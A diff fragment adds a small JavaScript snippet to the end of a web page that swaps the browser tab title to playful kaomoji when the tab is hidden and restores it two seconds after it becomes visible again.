+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '(～﹃～)~zZ';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(￣▽￣)';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+</body>
+</html>
